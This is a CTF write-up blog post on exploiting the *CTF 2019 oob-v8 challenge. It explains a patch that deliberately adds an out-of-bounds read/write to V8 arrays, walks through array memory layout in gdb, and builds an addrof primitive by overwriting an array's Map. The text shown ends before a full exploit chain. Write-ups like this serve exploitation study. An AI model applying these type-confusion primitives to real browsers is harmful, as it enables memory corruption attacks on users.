---
layout: post
title:  "v8 Exploitation: *CTF 2019 oob-v8"
date:   2019-12-12 23:59:00 +0800
categories: pwn
tags: *CTF-2019
---

# Introduction

I've recently been researching browsers, specifically JavaScript Engine exploitation in Chrome's v8. Being a CTF player myself, I thought doing a fairly recent CTF challenge might help me wrap my head around some of the exploitation techniques that are widely used provided a vulnerability ***does*** exist.

I picked the challenge `oob-v8` from `*CTF 2019`, because it seems as though all the writeups for it are fairly incomplete. They either assume a bunch of prerequisite knowledge, or just don't explain things well. I spent a lot of time debugging and understanding every part of my exploit, and popped calc in two separate ways.

The other reason I wanted to create this writeup is because most of the prerequisite knowledge required is scattered around a bunch of different places. I wanted to bring together all of that information in a single post, so that the reader will not need to read from multiple sources to understand the writeup.

I will assume that the reader is at least somewhat familiar with Linux userspace exploitation. Prior knowledge of JavaScript will not be required, but you may have to google a few things here and there if you really have never seen JavaScript code before.

Without further ado, let's get started.

## Building d8

`d8` is the name given to the JavaScript REPL created by Google for v8. I will build both the release and debug versions of it.

For reference, I am doing all of this on an Ubuntu 18.04.3 LTS vm.

You will first have to install Google's `depot_tools` and add the folder to your PATH by following the guide [here](https://commondatastorage.googleapis.com/chrome-infra-docs/flat/depot_tools/docs/html/depot_tools_tutorial.html#_setting_up):
```sh
pwn@ubuntu:~/tools$ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
pwn@ubuntu:~/tools$ echo "export PATH=/home/pwn/tools/depot_tools:$PATH" >> ~/.bashrc
```

Next, download the challenge archive from [here](https://github.com/Changochen/CTF/raw/master/2019/*ctf/Chrome.tar.gz). You will only need the `oob.diff` file from inside it. Run the following commands to download and build the correct version of d8:
```sh
pwn@ubuntu:~$ fetch v8
pwn@ubuntu:~$ cd v8
pwn@ubuntu:~/v8$ ./build/install-build-deps.sh # Assumes you're using apt
pwn@ubuntu:~/v8$ git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598
pwn@ubuntu:~/v8$ gclient sync
pwn@ubuntu:~/v8$ git apply ../oob.diff
pwn@ubuntu:~/v8$ ./tools/dev/v8gen.py x64.release
pwn@ubuntu:~/v8$ ninja -C ./out.gn/x64.release # Release version
pwn@ubuntu:~/v8$ ninja -C ./out.gn/x64.debug # Debug version
```

The builds will take a while, but afterwards, you will find the release build in `v8/out.gn/x64.release/d8`, and the debug build in `v8/out.gn/x64.debug/d8`.

## The patch

First, let's take a brief look at the patch file. You don't have to understand every single line of code (the v8 code base is huge after all), but you should be able to find the vulnerability fairly quickly:
```diff
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}
 
 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

Let's break it down a little bit:

* The two lines of code added in `src/bootstrapper.cc` essentially installs a builtin function for arrays called `oob`.
* The lines of code added in `src/builtins/builtins-definitions.h` and `src/compiler.typer.cc` are not important. They are required to add this builtin function correctly.
* The lines of code added into `src/builtins/builtins-array.cc` are important. The vulnerability lies here. 

I urge the reader to take a look at the code added to `src/builtins/builtins-array.cc` and try to spot the vulnerability. Even without any further context, it should be easy to spot.

* The function will initially check if the number of arguments is greater than 2 (the first argument is always the `this` argument). If it is, it returns undefined.
* If there is only one argument (`this`), it will cast the array into a `FixedDoubleArray` before returning the element at `array[length]`.
* If there are two arguments (`this` and `value`), it will write `value` as a float into `array[length]`.

Now, since arrays start with index 0, it is evident that `array[length]` results in an out-of-bounds access by one index at the end of the array. 

The question now is, how do we exploit it? In order to figure out what we can do with this vulnerability, we first have to find out what exists past an array's last index.

## What exists past the end of an array?

There are two ways you can figure this out. The much harder way is to go to [https://source.chromium.org](https://source.chromium.org) and try to find the layout of an array by reading the source code. However, that requires you to already have a deep understanding of the v8 code base. Since pointers are tagged (explained below), it means that v8 cannot just let the compiler define the in-memory layout of Objects. It is entirely done within the source code, and if you don't know where to look / don't understand the different parts of the code base, you will not be able to figure out the layout of an array by reading the source code.

Instead, let us use the fact that we can build a debug version of `d8` and run it through a debugger to view the memory layout of an array in real time. Note that you have to run `d8` with `./d8 --allow-natives-syntax` to get access to some of the debugging functions, such as `%DebugPrint()`.
```
pwn@ubuntu:~/v8/v8/out.gn/x64.debug$ gdb ./d8
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./d8...done.

gef➤  run --allow-natives-syntax
Starting program: /home/pwn/v8/v8/out.gn/x64.debug/d8 --allow-natives-syntax
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff30ec700 (LWP 12183)]
V8 version 7.5.0 (candidate)

d8> var a = [1.1, 2.2];
undefined
d8> %DebugPrint(a);
DebugPrint: 0x1dbbe77cdd79: [JSArray]
 - map: 0x11304a782ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x384656691111 <JSArray[0]>
 - elements: 0x1dbbe77cdd59 <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x172dc3640c71 <FixedArray[0]> {
    #length: 0x075e9d5801a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x1dbbe77cdd59 <FixedDoubleArray[2]> {
           0: 1.1
           1: 2.2
 }
0x11304a782ed9: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x11304a782e89 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x075e9d580609 <Cell value= 1>
 - instance descriptors #1: 0x384656691f49 <DescriptorArray[1]>
 - layout descriptor: (nil)
 - transitions #1: 0x384656691eb9 <TransitionArray[4]>Transition array #1:
     0x172dc3644ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x11304a782f29 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x384656691111 <JSArray[0]>
 - constructor: 0x384656690ec1 <JSFunction Array (sfi = 0x75e9d58aca1)>
 - dependent code: 0x172dc36402c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

[1.1, 2.2]
```

That is a lot of information. Before we dive in any further, I should explain that v8 uses a pointer tagging mechanism to distinguish between **pointers**, **doubles**, and **Smis**, which stands for `immediate small integer`. This information can be found in `src/objects.h`. Essentially, we have the following scenario:
```c
Double: Shown as the 64-bit binary representation without any changes
Smi: Represented as value << 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000
Pointers: Represented as addr & 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9
```

There is a little more to this, especially when TypedArrays are involved, but I will cover that later when it is relevant.

The important thing to note here is that any memory addresses you see from the `%DebugPrint(a)` output above will have their very last bit set. You need to subtract 1 from all memory addresses before trying to examine them in `gdb` in order to view the correct address in memory.

With that aside, let us view the array in memory:
```
gef➤  x/4gx 0x1dbbe77cdd79-1
0x1dbbe77cdd78:	0x000011304a782ed9	0x0000172dc3640c71
0x1dbbe77cdd88:	0x00001dbbe77cdd59	0x0000000200000000
```

Now, corroborating with the debug information given to us, we know that the first address corresponds to this array's `Map`. The second address corresponds to the array's `properties`. The third address corresponds to this array's `elements`. We can see the `elements` pointer points to a memory address that is just before this array. Viewing the `elements` now, we find this:
```
gef➤  x/10gx 0x00001dbbe77cdd59-1  <- access the elements pointer
0x1dbbe77cdd58:	0x0000172dc36414f9	0x0000000200000000 <-- FixedDoubleArray
0x1dbbe77cdd68:	0x3ff199999999999a	0x400199999999999a
0x1dbbe77cdd78:	0x000011304a782ed9	0x0000172dc3640c71 <-- JSArray
0x1dbbe77cdd88:	0x00001dbbe77cdd59	0x0000000200000000
0x1dbbe77cdd98:	0x0000172dc3640941	0x00000adc678412a2
gef➤  p/f 0x3ff199999999999a
$1 = 1.1000000000000001
gef➤  p/f 0x400199999999999a
$2 = 2.2000000000000002
```

So, `var a` is a `JSArray`, and it's `elements` pointer points to a `FixedDoubleArray` (which has its own `Map`) with the array values inlined starting from `elements[2]`. The `0x0000000200000000` is an `Smi` that corresponds to the `FixedDoubleArray`'s length (2 in this case, because remember, an `Smi` will be `value << 32`).

We can finally answer the question of "What exists past the end of an array?". If we access `a.oob()`, it will access the `Map` of the `JSArray`, since that is what comes immediately after the last index of the `FixedDoubleArray`.

Let's test this out. We cannot just do `a.oob()` on the debug version, as the debug version has runtime assertions that prevent out of bounds accesses (it helps fuzzers catch out of bounds accesses, amongst other things). We can see the effect of `a.oob()` on the release version:
```
d8> var a = [1.1, 2.2];
undefined
d8> %DebugPrint(a)
0x0017fc30dd79 <JSArray[2]>
[1.1, 2.2]
d8> a.oob();
5.5958667448768e-311

gef➤  x/4gx 0x0017fc30dd79-1
0x17fc30dd78:	0x00000a4d13c42ed9	0x00002042a2b00c71
0x17fc30dd88:	0x00000017fc30dd59	0x0000000200000000
gef➤  p/f 0x00000a4d13c42ed9
$1 = 5.5958667448767516e-311
```

Note that the output is given to us as a `double`. This is intended. Remember the patch? The array is first casted to a `FixedDoubleArray` before performing the out-of-bounds access, thus the value returned is also a `double`.

## What is a Map?

Now that we know we have the ability to overwrite a `JSArray`'s `Map`, we have to understand what a map is in order to figure out how we can exploit this vulnerability.

This section will only briefly cover what a Map is. [saelo](https://twitter.com/5aelo) covers this in much greater depth [here](http://www.phrack.org/papers/jit_exploitation.html). I urge the reader to read that if required.

saelo's phrack paper says the following:
>The Map of an object (arrays are objects) is a data structure that contains information such as:
>* The dynamic type of the object, i.e. String, Uint8Array, HeapNumber, ...
>* The size of the object in bytes
>* The properties of the object and where they are stored
>* The type of the array elements, e.g. unboxed doubles or tagged pointers
>* The prototype of the object if any
>
>While the property names are usually stored in the Map, the property values are stored within the object itself in one of several possible regions. The Map then provides the exact location of the property value in the respective region.

Essentially, the Map defines how an object should be accessed. Whether you access an object by doing `object["field"]`, or you access an array by doing `array[index]`, the Map of that object will tell the JS engine where to find that specific element in memory.

For example, remember the `JSArray` from above? If you try to access `a[0]`, the Map of the `JSArray` would tell the JS engine to go to the array, access its `elements` pointer, and return the value at `elements[2]` as that corresponds to the value at index 0 of `1.1` (Scroll up if this doesn't make sense).

Remember that we have the ability to overwrite an array's `Map` with one of our own. In this way, we can cause a type confusion within the JS engine if we overwrite one array's map with the map of a different array. 

In order to see how we can abuse this, let us see what a different array's map looks like. Let us take an array of Objects:
```
d8> var obj = {"A":1.1};
undefined
d8> var obj_arr = [obj];
undefined
d8> %DebugPrint(obj_arr);
0x3e35b57101a1 <JSArray[1]>
[{A: 1.1}]

gef➤  x/4gx 0x3e35b57101a1-1
0x3e35b57101a0:	0x000020149b602f79	0x000015d76ab40c71
0x3e35b57101b0:	0x00003e35b5710189	0x0000000100000000

gef➤  x/4gx 0x00003e35b5710189-1  <- access the elements pointer
0x3e35b5710188:	0x000015d76ab40801	0x0000000100000000
0x3e35b5710198:	0x00003e35b570dd19	0x000020149b602f79

gef➤  x/4gx 0x00003e35b570dd19-1  <- access index 0
0x3e35b570dd18:	0x000020149b60ab39	0x000015d76ab40c71
0x3e35b570dd28:	0x000015d76ab40c71	0x3ff199999999999a

gef➤  p/f 0x3ff199999999999a
$3 = 1.1000000000000001
```

As you can see, the `Map` of an array of objects is a little different. Where the float array had a float value at index 0, the object array has the address of the actual `obj` in the same place. If you attempt to access `obj_arr[0]`, it will not just print out the memory address of `obj`, but it will somehow dereference it and print `{A: 1.1}`.  

So, what happens if we leak the map of a float array and overwrite the object array's map with it? Instead of dereferencing the memory address at index 0, it should just treat it as a float avlue. Accessing index 0 should then leak the address of `obj` as a float, right?
```
d8> var float_arr = [1.1, 2.2];
undefined
d8> var float_arr_map = float_arr.oob();
undefined
d8> obj_arr.oob(float_arr_map);
undefined
d8> obj_arr[0];
3.3794286942881e-310
d8> %DebugPrint(obj);
0x3e35b570dd19 <Object map = 0x20149b60ab39>
{A: 1.1}

gef➤  p/f 0x3e35b570dd19
$4 = 3.3794286942880803e-310  <- same as leak
```

Success! In JS engine exploitation terminology, this is what is called an `addrof` primitive. The inverse of this (if we put a memory address at index 0 of our float array and change its map to that of the object array) is called a `fakeobj` primitive, as it allows you to place a fake object anywhere in memory in order to read from and write to it. I will not cover the `fakeobj` primitive here, as I use a different method to get arbitrary read/write.
